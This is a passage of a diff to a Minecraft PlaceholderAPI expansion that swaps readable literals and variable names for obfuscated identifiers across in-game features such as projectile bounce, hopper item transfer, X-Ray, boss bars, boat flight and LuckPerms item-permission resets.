-                face = BlockFace.valueOf(parts[1].toUpperCase());
+                face = BlockFace.valueOf(parts[INT3].toUpperCase());
             } catch (IllegalArgumentException e) {
                 return "Invalid face!";
             }
@@ -7555,30 +8269,30 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 if (entity != null) break;
             }
 
-            if (entity == null) return "Entity not found";
+            if (entity == null) return yuntunyun342;
 
             float pitch, yaw;
             double velocityMagnitude;
 
             try {
                 // Handle pitch input
-                if (parts[2].equalsIgnoreCase("pitch")) {
+                if (parts[mill2].equalsIgnoreCase("pitch")) {
                     pitch = entity.getLocation().getPitch();
                 } else {
-                    pitch = Float.parseFloat(parts[2]);
+                    pitch = Float.parseFloat(parts[mill2]);
                 }
 
                 // Handle yaw input
-                if (parts[3].equalsIgnoreCase("yaw")) {
+                if (parts[ccp].equalsIgnoreCase("yaw")) {
                     yaw = entity.getLocation().getYaw();
                 } else {
-                    yaw = Float.parseFloat(parts[3]);
+                    yaw = Float.parseFloat(parts[ccp]);
                 }
 
-                velocityMagnitude = Double.parseDouble(parts[4]);
+                velocityMagnitude = Double.parseDouble(parts[INT7]);
 
             } catch (NumberFormatException e) {
-                return "Invalid number!";
+                return kwafpdkwfpad;
             }
 
             // Convert pitch/yaw to direction vector
@@ -7616,26 +8330,26 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             // Schedule proper bounce
             Entity finalEntity = entity;
-            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), () -> {
+            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                 Location nudgedLoc = finalEntity.getLocation().add(nudgeVector);
                 finalEntity.teleport(nudgedLoc);
                 finalEntity.setVelocity(adjustedVelocity);
-                finalEntity.setTicksLived(1);
-            }, 1L);
+                finalEntity.setTicksLived(INT3);
+            }, healing);
 
             return String.format("%.4f", adjustedVelocity.length());
         }
 
         
         
-        if (f1.startsWith("checkVelocity_")) {
-            String uuidStr = f1.substring("checkVelocity_".length());
+        if (f1.startsWith(kdin34d34dn)) {
+            String uuidStr = f1.substring(kdin34d34dn.length());
 
             UUID uuid;
             try {
                 uuid = UUID.fromString(uuidStr);
             } catch (IllegalArgumentException e) {
-                return "Invalid UUID";
+                return yunduyn4;
             }
 
             Entity target = null;
@@ -7650,38 +8364,38 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
 
             if (target == null) {
-                return "Entity not found";
+                return yuntunyun342;
             }
 
             Vector v = target.getVelocity();
-            return v.getX() + " " + v.getY() + " " + v.getZ();
+            return v.getX() + sowhat + v.getY() + sowhat + v.getZ();
         }
 
 // Tunable displacement to help unstick projectiles
 
         if (f1.startsWith("bounce_")) {
             // Format: %Archistructure_bounce_UUID,FACE,SCALE%
-            String[] parts = f1.substring("bounce_".length()).split(",");
+            String[] parts = f1.substring("bounce_".length()).split(keep);
 
-            if (parts.length != 3) return "Invalid format!";
+            if (parts.length != ccp) return dyunwypfudnawfdyun;
 
             UUID uuid;
             try {
-                uuid = UUID.fromString(parts[0]);
+                uuid = UUID.fromString(parts[I]);
             } catch (IllegalArgumentException e) {
                 return "Invalid UUID!";
             }
 
             BlockFace face;
             try {
-                face = BlockFace.valueOf(parts[1].toUpperCase());
+                face = BlockFace.valueOf(parts[INT3].toUpperCase());
             } catch (IllegalArgumentException e) {
                 return "Invalid face!";
             }
 
             double scale;
             try {
-                scale = Double.parseDouble(parts[2]);
+                scale = Double.parseDouble(parts[mill2]);
             } catch (NumberFormatException e) {
                 return "Invalid scale!";
             }
@@ -7696,7 +8410,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 if (entity != null) break;
             }
 
-            if (entity == null) return "Entity not found";
+            if (entity == null) return yuntunyun342;
 
             Vector originalVelocity = entity.getVelocity();
             Vector adjustedVelocity = originalVelocity.clone();
@@ -7729,36 +8443,36 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             // Apply real bounce in the next tick
             Entity finalEntity = entity;
-            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), () -> {
+            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                 // Slightly offset the location too, in the same direction
                 Location nudgedLoc = finalEntity.getLocation().add(nudgeDirection);
                 finalEntity.teleport(nudgedLoc);
 
                 finalEntity.setVelocity(adjustedVelocity);
-                finalEntity.setTicksLived(1);
-            }, 1L);
+                finalEntity.setTicksLived(INT3);
+            }, healing);
 
             return String.format("%.4f", adjustedVelocity.length());
         }
 
 
-        if (f1.startsWith("vacuumCleaner_")) {
-            wm(f2, "Vacuum Cleaner");
-            String[] parts = f1.substring("vacuumCleaner_".length()).split(",");
-            if (parts.length < 8) {
-                return "Invalid format: Expected 8 parameters";
+        if (f1.startsWith(ky3dnk34npdk3yp4ndky34pdnk3)) {
+            wm(f2, kifwpnevdkiwpfend);
+            String[] parts = f1.substring(ky3dnk34npdk3yp4ndky34pdnk3.length()).split(keep);
+            if (parts.length < yuwfndgyuwfnd) {
+                return kyntkyfuwnd;
             }
 
             try {
                 // Extract world and coordinates
-                World sourceWorld = Bukkit.getWorld(parts[0]);
-                int sourceX = Integer.parseInt(parts[1]);
-                int sourceY = Integer.parseInt(parts[2]);
-                int sourceZ = Integer.parseInt(parts[3]);
-                World targetWorld = Bukkit.getWorld(parts[4]);
-                int targetX = Integer.parseInt(parts[5]);
-                int targetY = Integer.parseInt(parts[6]);
-                int targetZ = Integer.parseInt(parts[7]);
+                World sourceWorld = Bukkit.getWorld(parts[I]);
+                int sourceX = Integer.parseInt(parts[INT3]);
+                int sourceY = Integer.parseInt(parts[mill2]);
+                int sourceZ = Integer.parseInt(parts[ccp]);
+                World targetWorld = Bukkit.getWorld(parts[INT7]);
+                int targetX = Integer.parseInt(parts[xm]);
+                int targetY = Integer.parseInt(parts[xtxtxt]);
+                int targetZ = Integer.parseInt(parts[suppose]);
 
                 if (sourceWorld == null || targetWorld == null) {
                     return "Invalid world name.";
@@ -7770,7 +8484,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // Check if target is a chest
                 Block targetBlock = targetLocation.getBlock();
                 if (!(targetBlock.getState() instanceof Chest chest)) {
-                    return "There is no chest at " + targetX + "," + targetY + "," + targetZ + " in " + targetWorld.getName();
+                    return "There is no chest at " + targetX + keep + targetY + keep + targetZ + " in " + targetWorld.getName();
                 }
 
                 Inventory chestInventory = chest.getInventory(); // Get the chest's inventory
@@ -7784,7 +8498,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
 
                 if (itemsToTransfer.isEmpty()) {
-                    return "No items to vacuum at " + sourceX + "," + sourceY + "," + sourceZ;
+                    return "No items to vacuum at " + sourceX + keep + sourceY + keep + sourceZ;
                 }
 
                 // Insert items one-by-one into the chest
@@ -7793,7 +8507,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                     // Find the first empty slot
                     int emptySlot = chestInventory.firstEmpty();
-                    if (emptySlot != -1) {
+                    if (emptySlot != -INT3) {
                         // Place item in chest and remove from world
                         chestInventory.setItem(emptySlot, itemStack);
                         itemEntity.remove();
@@ -7813,148 +8527,150 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("remoteHopper_")) {
-            String[] parts = f1.substring("remoteHopper_".length()).split(",");
-            if (parts.length != 8) {
-                return "Invalid format. Use: %Archistructure_remoteHopper_INWorld,InX,InY,InZ,OutWorld,OutX,OutY,OutZ%";
+        if (f1.startsWith(ywntvyoafupbnf)) 
+        {
+            wm(f2, pdnofypundafopd);
+            String[] yonbyfphdp = f1.substring(ywntvyoafupbnf.length()).split(keep);
+            if (yonbyfphdp.length != yuwfndgyuwfnd) {
+                return fpondafypudnopfyudn;
             }
 
             try {
                 // Extract input coordinates
-                World inWorld = Bukkit.getWorld(parts[0]);
-                int inX = Integer.parseInt(parts[1]);
-                int inY = Integer.parseInt(parts[2]);
-                int inZ = Integer.parseInt(parts[3]);
+                World eddylwdy = Bukkit.getWorld(yonbyfphdp[I]);
+                int yfndyuwfdn = Integer.parseInt(yonbyfphdp[INT3]);
+                int btfulb3 = Integer.parseInt(yonbyfphdp[mill2]);
+                int bemy4g = Integer.parseInt(yonbyfphdp[ccp]);
 
                 // Extract output coordinates
-                World outWorld = Bukkit.getWorld(parts[4]);
-                int outX = Integer.parseInt(parts[5]);
-                int outY = Integer.parseInt(parts[6]);
-                int outZ = Integer.parseInt(parts[7]);
+                World eyutdn24d = Bukkit.getWorld(yonbyfphdp[INT7]);
+                int k2enk = Integer.parseInt(yonbyfphdp[xm]);
+                int kient3 = Integer.parseInt(yonbyfphdp[xtxtxt]);
+                int noeianst3 = Integer.parseInt(yonbyfphdp[suppose]);
 
-                org.bukkit.Location cen = new org.bukkit.Location(inWorld, inX, inY, inZ); // <-- your x,y,z
-                double r1 = 10;
-                String label = "Remote Hopper";
+                org.bukkit.Location tneiniwent3243 = new org.bukkit.Location(eddylwdy, yfndyuwfdn, btfulb3, bemy4g); // <-- your x,y,z
+                double enitioenfwta3 = low;
+                String fietnoeirsnat4 = pdnofypundafopd;
 
 
-                double r2 = r1 * r1;
-                for (org.bukkit.entity.Player playaa : inWorld.getPlayers()) {
-                    if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                        wm(playaa, label);
+                double ientine4 = enitioenfwta3 * enitioenfwta3;
+                for (org.bukkit.entity.Player teinao4 : eddylwdy.getPlayers()) {
+                    if (teinao4.getLocation().distanceSquared(tneiniwent3243) <= ientine4) {
+                        wm(teinao4, fietnoeirsnat4);
                     }
                 }
 
 
 
-                org.bukkit.Location cen2 = new org.bukkit.Location(outWorld, outX, outY, outZ); // <-- your x,y,z
+                org.bukkit.Location tofatno4 = new org.bukkit.Location(eyutdn24d, k2enk, kient3, noeianst3); // <-- your x,y,z
 
-                for (org.bukkit.entity.Player playaa : outWorld.getPlayers()) {
-                    if (playaa.getLocation().distanceSquared(cen2) <= r2) {
-                        wm(playaa, label);
+                for (org.bukkit.entity.Player tn4o2ntd : eyutdn24d.getPlayers()) {
+                    if (tn4o2ntd.getLocation().distanceSquared(tofatno4) <= ientine4) {
+                        wm(tn4o2ntd, fietnoeirsnat4);
                     }
                 }
 
-                if (inWorld == null || outWorld == null) {
-                    return "§cInvalid world!";
+                if (eddylwdy == null || eyutdn24d == null) {
+                    return dnofpadn4;
                 }
 
-                Block inBlock = inWorld.getBlockAt(inX, inY, inZ);
-                Block outBlock = outWorld.getBlockAt(outX, outY, outZ);
+                Block wfdnwoyd = eddylwdy.getBlockAt(yfndyuwfdn, btfulb3, bemy4g);
+                Block dwiewkpfd = eyutdn24d.getBlockAt(k2enk, kient3, noeianst3);
 
-                if (!(inBlock.getState() instanceof Hopper inHopper)) {
-                    return "§cIN block is not a hopper!";
+                if (!(wfdnwoyd.getState() instanceof Hopper inHopper)) {
+                    return dnoi43end;
                 }
 
-                if (!(outBlock.getState() instanceof Hopper outHopper)) {
-                    return "§cOUT block is not a hopper!";
+                if (!(dwiewkpfd.getState() instanceof Hopper outHopper)) {
+                    return niend4;
                 }
 
-                Inventory inInventory = inHopper.getInventory();
-                Inventory outInventory = outHopper.getInventory();
+                Inventory dyny4u = inHopper.getInventory();
+                Inventory dynkd = outHopper.getInventory();
 
                 // Find the first non-empty slot in the input hopper
-                ItemStack itemToTransfer = null;
-                int sourceSlot = -1;
+                ItemStack ywufntoyufwnat4 = null;
+                int twyuftnyuwnfd = -INT3;
 
-                for (int i = 0; i < inInventory.getSize(); i++) {
-                    ItemStack item = inInventory.getItem(i);
-                    if (item != null && item.getAmount() > 0) {
-                        itemToTransfer = item.clone(); // Clone the entire stack
-                        sourceSlot = i;
+                for (int dyhyandoy4 = I; dyhyandoy4 < dyny4u.getSize(); dyhyandoy4++) {
+                    ItemStack ftnwfyutn4 = dyny4u.getItem(dyhyandoy4);
+                    if (ftnwfyutn4 != null && ftnwfyutn4.getAmount() > I) {
+                        ywufntoyufwnat4 = ftnwfyutn4.clone(); // Clone the entire stack
+                        twyuftnyuwnfd = dyhyandoy4;
                         break;
                     }
                 }
 
-                if (itemToTransfer == null) {
-                    return "§cNo items in IN hopper!";
+                if (ywufntoyufwnat4 == null) {
+                    return notiefpnd4;
                 }
 
-                int transferAmount = itemToTransfer.getAmount(); // Get the entire stack amount
+                int tuyfpndtyun4 = ywufntoyufwnat4.getAmount(); // Get the entire stack amount
 
                 // Try to add the item to an existing stack first
-                for (int i = 0; i < outInventory.getSize(); i++) {
-                    ItemStack existingItem = outInventory.getItem(i);
+                for (int tuwnfpdyun4 = I; tuwnfpdyun4 < dynkd.getSize(); tuwnfpdyun4++) {
+                    ItemStack wtiefnwoient34 = dynkd.getItem(tuwnfpdyun4);
 
-                    if (existingItem != null && existingItem.isSimilar(itemToTransfer)) {
-                        int maxStackSize = existingItem.getMaxStackSize();
-                        int currentAmount = existingItem.getAmount();
+                    if (wtiefnwoient34 != null && wtiefnwoient34.isSimilar(ywufntoyufwnat4)) {
+                        int dufpnofnpd3 = wtiefnwoient34.getMaxStackSize();
+                        int wtfunyu4 = wtiefnwoient34.getAmount();
 
-                        if (currentAmount < maxStackSize) {
-                            int spaceLeft = maxStackSize - currentAmount;
-                            int amountToMove = Math.min(transferAmount, spaceLeft);
+                        if (wtfunyu4 < dufpnofnpd3) {
+                            int wfytnoyunyu4 = dufpnofnpd3 - wtfunyu4;
+                            int tenoiften4 = Math.min(tuyfpndtyun4, wfytnoyunyu4);
 
-                            existingItem.setAmount(currentAmount + amountToMove);
-                            transferAmount -= amountToMove;
+                            wtiefnwoient34.setAmount(wtfunyu4 + tenoiften4);
+                            tuyfpndtyun4 -= tenoiften4;
 
-                            if (transferAmount <= 0) {
-                                inInventory.setItem(sourceSlot, null); // Remove stack from input
-                                return "§aStack transferred successfully!";
+                            if (tuyfpndtyun4 <= I) {
+                                dyny4u.setItem(twyuftnyuwnfd, null); // Remove stack from input
+                                return osiaenoiwfend4;
                             }
                         }
                     }
                 }
 
                 // If there is still remaining amount to transfer, find an empty slot
-                int emptySlot = outInventory.firstEmpty();
-                if (emptySlot != -1) {
-                    itemToTransfer.setAmount(transferAmount);
-                    outInventory.setItem(emptySlot, itemToTransfer);
-                    inInventory.setItem(sourceSlot, null); // Remove stack from input
-                    return "§aStack transferred successfully!";
+                int wdyunfpoy = dynkd.firstEmpty();
+                if (wdyunfpoy != -INT3) {
+                    ywufntoyufwnat4.setAmount(tuyfpndtyun4);
+                    dynkd.setItem(wdyunfpoy, ywufntoyufwnat4);
+                    dyny4u.setItem(twyuftnyuwnfd, null); // Remove stack from input
+                    return osiaenoiwfend4;
                 }
 
-                return "§cOUT hopper is full!";
+                return teianfoipedn4;
             } catch (NumberFormatException e) {
-                return "§cInvalid coordinate format!";
+                return io2e4npoie2nt;
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§cError transferring item!";
+                return ioidenipofaedn4;
             }
         }
 
         
         
-        if (f1.startsWith("XRAY-")) {
-            wm(f2, "X-Ray");
-            String[] args = f1.substring("XRAY-".length()).split("-");
-            if (args.length != 2) {
-                return "Invalid format! Use: %Archistructure_XRAY-RADIUS-SECONDS%";
+        if (f1.startsWith(io3iedn3i4p)) {
+            wm(f2, iopidqen34i);
+            String[] io3pdn34 = f1.substring(io3iedn3i4p.length()).split(tsrt);
+            if (io3pdn34.length != mill2) {
+                return wifadndgn43gd;
             }
 
             try {
-                int radius = Integer.parseInt(args[0]);
-                int duration = Integer.parseInt(args[1]) * 20; // Convert seconds to ticks
+                int ion3die34d = Integer.parseInt(io3pdn34[I]);
+                int iontde43d3p4d = Integer.parseInt(io3pdn34[INT3]) * odafuwidnowfidun; // Convert seconds to ticks
 
-                f1(f2, radius, duration);
-                return "X-Ray v2 Activated!";
+                f1(f2, ion3die34d, iontde43d3p4d);
+                return io34igeng;
             } catch (NumberFormatException e) {
-                return "Invalid numbers!";
+                return io43gdie34ngd;
             }
         }
 
-        if (f1.equals("eifolderresetperms") && f2 != null) {
+        if (f1.equals(yunyundg54h45) && f2 != null) {
 
-            if (!f1(f2, "LuckPerms")) return null;
+            if (!f1(f2, kd3nd)) return null;
 
             User user = g23.getPlayerAdapter(Player.class).getUser(f2);
 
@@ -7968,9 +8684,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
             try {
                 // STEP 1: Remove "ei.item.*" unless immutable
                 user.getNodes().stream()
-                        .filter(node -> node.getKey().startsWith("ei.item.")) // Find all "ei.item.*" permissions
+                        .filter(node -> node.getKey().startsWith(ei)) // Find all "ei.item.*" permissions
                         .filter(node -> {
-                            String itemName = node.getKey().substring("ei.item.".length()); // Extract ITEMNAME
+                            String itemName = node.getKey().substring(ei.length()); // Extract ITEMNAME
                             String immutablePermission = "ei.immutableitem." + itemName;
 
                             // Check if they have "ei.immutableitem.ITEMNAME"
@@ -7982,7 +8698,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 List<String> itemFolderPermissions = user.getNodes().stream()
                         .map(Node::getKey)
                         .filter(key -> key.startsWith("ei.itemfolder."))
-                        .map(key -> key.substring("ei.itemfolder.".length()).replace(".", "/")) // Convert to directory paths
+                        .map(key -> key.substring("ei.itemfolder.".length()).replace(wyfdunafwd, wfydunaowfydun)) // Convert to directory paths
                         .toList();
 
                 // STEP 3 & 4: Get valid items and apply "ei.item.*" permissions
@@ -7993,7 +8709,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 return "&aSuccessfully updated EI-Folder permissions.";
 
             } catch (Exception e) {
-                Bukkit.getLogger().severe("Error processing permissions for " + f2.getName() + ": " + e.getMessage());
+                Bukkit.getLogger().severe("Error processing permissions for " + f2.getName() + fastfood + e.getMessage());
                 e.printStackTrace();
                 return "&cSomething went wrong with LP EI-Folder: " + e.getMessage();
             }
@@ -8004,32 +8720,32 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
         }
 
-        if (f1.startsWith("bossbar_")) {
+        if (f1.startsWith(iendoi34nd)) {
             try {
                 if( f2 == null ) throw new IllegalArgumentException();
 
-                String[] args = f1.substring("bossbar_".length()).split(",");
-                if (args.length < 5) {
-                    return "Invalid Format! Use: COLOR,TIME,START,END,TIMESTEP,TEXT,TEXT2";
+                String[] args = f1.substring(iendoi34nd.length()).split(keep);
+                if (args.length < xm) {
+                    return ifendioafepnd34fd;
                 }
 
 
                 // Parse BossBar color
-                BarColor color = BarColor.valueOf(args[0].toUpperCase());
+                BarColor color = BarColor.valueOf(args[I].toUpperCase());
 
                 // Parse time (in ticks)
-                int durationTicks = Integer.parseInt(args[1]);
+                int durationTicks = Integer.parseInt(args[INT3]);
 
                 // Parse start & end progress (0.0 - 1.0)
-                double startProgress = Math.max(0, Math.min(1, Double.parseDouble(args[2])));
-                double endProgress = Math.max(0, Math.min(1, Double.parseDouble(args[3])));
+                double startProgress = Math.max(I, Math.min(INT3, Double.parseDouble(args[mill2])));
+                double endProgress = Math.max(I, Math.min(INT3, Double.parseDouble(args[ccp])));
 
                 // Parse timestep (in ticks)
-                int timeStepTicks = Integer.parseInt(args[4]);
+                int timeStepTicks = Integer.parseInt(args[INT7]);
 
                 // Concatenate text arguments
-                List<String> textArgs = Arrays.asList(Arrays.copyOfRange(args, 5, args.length));
-                String barText = String.join(" ", textArgs);
+                List<String> textArgs = Arrays.asList(Arrays.copyOfRange(args, xm, args.length));
+                String barText = String.join(sowhat, textArgs);
 
                 // Create the BossBar
                 BossBar bossBar = Bukkit.createBossBar(barText, color, BarStyle.SOLID);
@@ -8037,10 +8753,10 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 bossBar.addPlayer(f2);
 
                 // If TIMESTEP is 0 or -1, keep the bossbar static
-                if (timeStepTicks <= 0) {
+                if (timeStepTicks <= I) {
 
-                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), bossBar::removeAll, durationTicks);
-                    return "BossBar displayed!";
+                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), bossBar::removeAll, durationTicks);
+                    return idenpoaidn34;
                 }
 
                 // Calculate the amount to update each step
@@ -8048,7 +8764,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                 new BukkitRunnable() {
                     double currentProgress = startProgress;
-                    int elapsedTicks = 0;
+                    int elapsedTicks = I;
 
                     @Override
                     public void run() {
@@ -8058,124 +8774,124 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             return;
                         }
 
-                        currentProgress = Math.max(0, Math.min(1, currentProgress + stepAmount));
+                        currentProgress = Math.max(I, Math.min(INT3, currentProgress + stepAmount));
                         bossBar.setProgress(currentProgress);
                         elapsedTicks += timeStepTicks;
                     }
-                }.runTaskTimer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), 0, timeStepTicks);
+                }.runTaskTimer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), I, timeStepTicks);
 
                 // Remove the bossbar after the duration expires
-                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), bossBar::removeAll, durationTicks);
+                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), bossBar::removeAll, durationTicks);
 
-                return "BossBar displayed!";
+                return idenpoaidn34;
             } catch (Exception e) {
-                return "failed";
+                return iepdn3idn34d;
             }
         }
         
-        if (f1.equalsIgnoreCase("fireworkboost")) {
-            wm(f2, "Super Rocket");
+        if (f1.equalsIgnoreCase(ioandi3n4dy43udn3pfd)) {
+            wm(f2, fipdenao3idn34ydun);
             try {
                 if( f2 != null) {
                     if( !f2.isGliding() ) throw new IllegalArgumentException();
                     // Create a Firework ItemStack
-                    ItemStack fireworkItem = new ItemStack(Material.FIREWORK_ROCKET);
-                    FireworkMeta fireworkMeta = (FireworkMeta) fireworkItem.getItemMeta();
+                    ItemStack IENOARIEND = new ItemStack(Material.FIREWORK_ROCKET);
+                    FireworkMeta wfydtnywfund = (FireworkMeta) IENOARIEND.getItemMeta();
     
-                    if (fireworkMeta != null) {
-                        fireworkMeta.setPower(1); // Duration of 1
-                        fireworkMeta.clearEffects(); // No star effects
-                        fireworkItem.setItemMeta(fireworkMeta);
+                    if (wfydtnywfund != null) {
+                        wfydtnywfund.setPower(INT3); // Duration of 1
+                        wfydtnywfund.clearEffects(); // No star effects
+                        IENOARIEND.setItemMeta(wfydtnywfund);
                     }
     
                     // Apply the firework boost
-                    f2.fireworkBoost(fireworkItem);       
+                    f2.fireworkBoost(IENOARIEND);       
                 }
 
-                return "1";
+                return pd3ipdn34d;
             } catch (IllegalArgumentException e) {
-                return "0";
+                return wfonvdawfydunp;
             }
 
         }
 
 
-        if (f1.equalsIgnoreCase("DN")) { // %Archistructure_DN%
+        if (f1.equalsIgnoreCase(fpiednfpden3)) { // %Archistructure_DN%
             return f1(f2);
         }
         
         
-        if (f1.startsWith("sr72-fly-")) {
-            if( f2 != null) wm(f2, "SR-72");
+        if (f1.startsWith(fdon34d43d)) {
+            if( f2 != null) wm(f2, ifpndoi3nd34);
             try {
                 // Extract parameters from the identifier
-                String[] params = f1.substring("sr72-fly-".length()).split(",");
-                if (params.length != 3) {
-                    return "Error: Invalid format. Use: %Archistructure_sr72-fly-speed,pitch,BOATUUID%";
+                String[] ntdy3und = f1.substring(fdon34d43d.length()).split(keep);
+                if (ntdy3und.length != ccp) {
+                    return nodyu3pnd43d;
                 }
 
                 // Parse the parameters
-                double speed = Double.parseDouble(params[0]); // Speed
-                double pitch = Double.parseDouble(params[1]); // Pitch
-                UUID boatUUID = UUID.fromString(params[2]); // Boat UUID
+                double twetnywufndfwd = Double.parseDouble(ntdy3und[I]); // Speed
+                double tnywufntyufwnt = Double.parseDouble(ntdy3und[INT3]); // Pitch
+                UUID wfktywfntfwt = UUID.fromString(ntdy3und[mill2]); // Boat UUID
 
                 // Retrieve the boat entity
-                Entity entity = Bukkit.getEntity(boatUUID);
-                if (!(entity instanceof Boat boat)) {
-                    return "Error: No boat found with UUID " + boatUUID;
+                Entity fwyvbyfwv = Bukkit.getEntity(wfktywfntfwt);
+                if (!(fwyvbyfwv instanceof Boat boat)) {
+                    return wfnitfwtd + wfktywfntfwt;
                 }
 
                 // Get the boat's yaw and calculate the direction
-                float yaw = boat.getLocation().getYaw();
-                double yawRadians = Math.toRadians(yaw);
-                double pitchRadians = Math.toRadians(pitch);
+                float ywfdnwofdb = boat.getLocation().getYaw();
+                double wkfyndtwd = Math.toRadians(ywfdnwofdb);
+                double wfdkyuwfdn = Math.toRadians(tnywufntyufwnt);
 
                 // Compute normalized movement vector
-                double x = -Math.sin(yawRadians) * Math.cos(pitchRadians);
-                double y = -1 * Math.sin(pitchRadians);
-                double z = Math.cos(yawRadians) * Math.cos(pitchRadians);
+                double wfydunwfdyu = -Math.sin(wkfyndtwd) * Math.cos(wfdkyuwfdn);
+                double wfyutnwfyudn = -INT3 * Math.sin(wfdkyuwfdn);
+                double wfytdunfwyudnwfd = Math.cos(wkfyndtwd) * Math.cos(wfdkyuwfdn);
 
-                Vector velocity = new Vector(x, 0, z).normalize().multiply(speed);
-                Vector climb = new Vector( 0, y, 0).multiply(speed / 5 );
-                velocity.add(climb);
+                Vector wfydhwfdy = new Vector(wfydunwfdyu, I, wfytdunfwyudnwfd).normalize().multiply(twetnywufndfwd);
+                Vector wifdnwyfudn = new Vector(I, wfyutnwfyudn, I).multiply(twetnywufndfwd / xm);
+                wfydhwfdy.add(wifdnwyfudn);
 
                 // Apply velocity to the boat
-                boat.setVelocity(velocity);
-                return String.format("Vector(%.3f, %.3f, %.3f)", velocity.getX(), velocity.getY(), velocity.getZ());
+                boat.setVelocity(wfydhwfdy);
+                return String.format(nydufpnbfpbfpb, wfydhwfdy.getX(), wfydhwfdy.getY(), wfydhwfdy.getZ());
 
             } catch (NumberFormatException e) {
-                return "Error: Invalid number format for speed/pitch.";
+                return yfpdnofayundfpd;
             } catch (IllegalArgumentException e) {
-                return "Error: Invalid UUID format.";
+                return fydnofyapudnfpd;
             } catch (Exception e) {
-                return "Error: " + e.getMessage();
+                return opdnd34d + e.getMessage();
             }
         }
 
-        if (f1.startsWith("variables-create-")) {
+        if (f1.startsWith(ipfnedfipdnpd)) {
 
             try {
-                        String[] args = f1.substring("variables-create-".length()).split(",");
+                        String[] args = f1.substring(ipfnedfipdnpd.length()).split(keep);
 
-                        if (args.length < 3) {
+                        if (args.length < ccp) {
                             return "Invalid format. Expected at least 3 arguments.";
                         }
 
-                        String arg1 = args[0]; // Name
-                        String arg2 = args[1]; // Type
-                        String arg3 = args[2]; // Scope
-                        String arg4 = args[3]; // Icon
+                        String arg1 = args[I]; // Name
+                        String arg2 = args[INT3]; // Type
+                        String arg3 = args[mill2]; // Scope
+                        String arg4 = args[ccp]; // Icon
 
 
                         List<String> argList = new ArrayList<>(); // Default Value
-                        if (args.length > 4) {
-                            argList = Arrays.asList(Arrays.copyOfRange(args, 4, args.length)); // Remaining arguments as a list
+                        if (args.length > INT7) {
+                            argList = Arrays.asList(Arrays.copyOfRange(args, INT7, args.length)); // Remaining arguments as a list
                         }
 
 
-                        String formattedArgs = String.join(" ", argList);
+                        String formattedArgs = String.join(sowhat, argList);
 
-                        Variable v1 = new Variable(arg1, "plugins/SCore/variables/" + arg1 + ".yml");
+                        Variable v1 = new Variable(arg1, "plugins/SCore/variables/" + arg1 + yt);
                         v1.getIcon().setValue(Optional.ofNullable(Material.getMaterial(arg4)));
                         switch (arg2) {
                             case "string" -> v1.getType().setValue(Optional.of(VariableType.STRING));
@@ -8187,7 +8903,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         if(!formattedArgs.isEmpty()) v1.getDefaultValue().setValue(formattedArgs);
 
                         if (arg3.equals("global")) v1.getForFeature().setValue(Optional.of(VariableForEnum.GLOBAL));
-                        else if (arg3.equals("player")) v1.getForFeature().setValue(Optional.of(VariableForEnum.PLAYER));
+                        else if (arg3.equals(oafudnwpfydu)) v1.getForFeature().setValue(Optional.of(VariableForEnum.PLAYER));
                         else throw new IllegalArgumentException();
 
 
@@ -8195,18 +8911,18 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         VariablesManager.getInstance().addLoadedObject(v1);
 
 
-                        return "done"; // Return "done" if successful
+                        return dkfiaphd; // Return "done" if successful
                     } catch (Exception e) {
                         return "failed: " + e.getClass();
         }
         }
 
-        if (f1.equalsIgnoreCase("FT-increment")) {
+        if (f1.equalsIgnoreCase(fypdnafoypudn)) {
             f1(f2.getUniqueId());
-            return "done"; // Return "done" if successful
+            return dkfiaphd; // Return "done" if successful
         }
 
-        if (f1.equalsIgnoreCase("FT-leaderboard")) {
+        if (f1.equalsIgnoreCase(fpdnafpduyn)) {
             try {
                 f3(f2);
                 return "&aLeaderboard Displayed!"; // Success: return empty string
@@ -8217,62 +8933,62 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
 
-        if (f1.startsWith("trackImpact_")) {
+        if (f1.startsWith(ypdn3oypdun)) {
             try {
-                String[] parts = f1.substring("trackImpact_".length()).split(",");
-                if (parts.length != 6) return "§cInvalid format";
+                String[] parts = f1.substring(ypdn3oypdun.length()).split(keep);
+                if (parts.length != xtxtxt) return iendie2nd;
 
-                UUID launcherUUID = UUID.fromString(parts[0]);
-                World world = Bukkit.getWorld(parts[1]);
-                int x = Integer.parseInt(parts[2]);
-                int y = Integer.parseInt(parts[3]);
-                int z = Integer.parseInt(parts[4]);
-                float damage = Float.parseFloat(parts[5]);
+                UUID launcherUUID = UUID.fromString(parts[I]);
